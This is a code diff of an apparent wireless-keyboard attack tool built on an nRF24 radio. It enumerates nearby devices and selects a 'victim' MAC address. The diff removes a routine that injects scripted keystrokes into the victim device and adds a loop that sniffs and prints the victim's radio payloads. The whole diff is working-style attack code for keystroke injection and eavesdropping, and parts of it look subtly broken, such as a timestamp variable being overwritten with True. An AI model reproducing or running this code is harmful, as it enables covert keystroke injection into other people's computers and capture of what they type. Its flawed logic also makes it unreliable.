@@ -30,18 +30,16 @@ counter = 0
 ping = [0x0f, 0x0f, 0x0f, 0x0f]
 f = open('keys.json')
 keys = json.load(f)
-script = open('script.txt', 'r')
-keepalive_timeout = [0, 79, 0, 3, 176, 16, 0, 0, 0, 237]
-keepalive = [0, 64, 3, 176, 12]
-keystrokes = []
-
+keepalive_timeout2 = [0, 79, 0, 3, 112, 0, 0, 0, 0, 62]
+keepalive_timeout1=[0, 79, 0, 0, 85, 0, 0, 0, 0, 92]
+keepalive = [0, 64, 3, 112, 77]
 
 def init():
     global channels
     global radio
     nrf24_reset.reset_radio(0)
     # Initialize the radio
-    radio = nrf24.nrf24()
+    radio = nrf24.nrf24(0)
     print('[+] radio initialized')
     radio.enter_promiscuous_mode()
     print('[+] entered promescious mode ')
@@ -148,96 +146,42 @@ def choose_victim():
 
 
 def attack(victim_mac):
+    print('[+] sniffing')
+    sniff_device(victim_mac)
+
+
+def sniff_device(addr):
     global devices
     global radio
-    global keystrokes
-    parse_script()
-    print('[+] parsed script')
-    time.sleep(1)
-    print('[+] entered sniffer mode')
-    radio.enter_sniffer_mode(str_to_addr(victim_mac))
-    time.sleep(1)
-    radio.set_channel(devices[victim_mac]['channel'][0])
-    print('[+] changed to device channel:')
-    time.sleep(1)
-    print('[+] attacking...', victim_mac)
-    time.sleep(1)
-
-    send(victim_mac)
-
-
-def send(mac):
-
-    global radio
-    global ping
-    global  channels
-    global keystrokes
-    global device
+    a = [0, 211, 18, 163, 216, 250, 76, 215, 220, 137, 114, 218, 152, 251, 0, 0, 0, 0, 0, 0, 0, 63]
+    b = [111, 140, 102, 4, 126, 199, 217]
+    # sniffer mode allows us to spoof the mac address
+    last_found = time.time()
+    timeout = 0.1
+    mac_address = str_to_addr(addr)
     found = False
+    radio.enter_sniffer_mode(mac_address)
+    while True:
+        if time.time() - last_found > timeout:
+            if not radio.transmit_payload(ping, 10, 5):
+                found = False
+                for channel in devices[addr]['channel']:
+                    radio.set_channel(channel)
+                    if radio.transmit_payload(ping, 10, 5):
+                        last_found = time.time()
+                        last_found = True
+                        break
+            else:
+                last_found = time.time()
+        value = radio.receive_payload()
 
-    if not radio.transmit_payload(ping):
-        found = False
-    else:
-        for channel in devices[mac]['channel']:
-            radio.set_channel(channel)
-            if radio.transmit_payload(ping):
-                send_packet()
-                found = True
-                break
-    if not found:
-        for ch in channels:
-            radio.set_channel(ch)
-            if radio.transmit_payload(ping):
-                send_packet()
-                break
-
-
-
-def send_packet():
-    global radio
-    global ping
-    global keystrokes
-    global devices
-    for i in keystrokes:
-        radio.transmit_payload(i[0])
-        time.sleep(i[1])
+        if value[0] == 0:
+            i = 0
 
 
-
-def parse_script():
-    global keys
-    global script
-    global keysrokes
-    keystrokes.append([keepalive_timeout, 0.012])
-    keystrokes.append([keepalive, 0.01])
-
-    for line in script:
-        words = line.split()
-        action = line.split()[0]
-        index = 0
-        for word in words[1:]:
-            index += 1
-            if action == 'command':
-                keystrokes.append([keys['command'][word], 0.012])
-                keystrokes.append([keys['key-up'], 0.012])
-                keystrokes.append([keepalive, 0])
-
-            if action == 'string':
-                for x in word:
-                    keystrokes.append([keys['string'][x], 0.012])
-
-                    keystrokes.append([keys['key-up'], 0.012])
-
-                    keystrokes.append([keepalive, 0])
-
-                if index < len(words):
-                    keystrokes.append([keys['string']['space'], 0.012])
-                    keystrokes.append([keys['key-up'], 0.012])
-                    keystrokes.append([keepalive, 0])
-
-            if action == 'delay':
-                for i in range(0, int(word)):
-                    keystrokes.append([keepalive, 0.01])
+            print(value[1:])
+            # Reset the channel timer
+            last_ping = time.time()
 
 
 if __name__ == "__main__":
@@ -254,4 +198,4 @@ if __name__ == "__main__":
     output_devices()
     victim_mac = choose_victim()
     print('attacking victim mac: ', victim_mac)
-    attack(victim_mac)
+    sniff_device(victim_mac)
